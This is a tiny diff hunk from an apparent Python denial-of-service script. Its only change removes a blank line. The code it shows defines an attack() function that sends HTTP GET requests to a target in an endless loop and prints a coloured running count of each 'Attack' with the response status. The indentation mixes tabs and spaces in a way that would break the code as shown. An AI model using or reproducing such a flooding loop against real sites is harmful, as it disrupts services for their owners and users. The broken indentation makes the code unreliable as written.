@@ -14,7 +14,6 @@ attack_num = 0
 def attack():
     while True:
 	r = requests.get(target)
-        
         global attack_num
         attack_num += 1
         print(f"{Fore.YELLOW}Attack №{attack_num}!{Fore.RESET} - {Fore.GREEN}{r.status_code}")
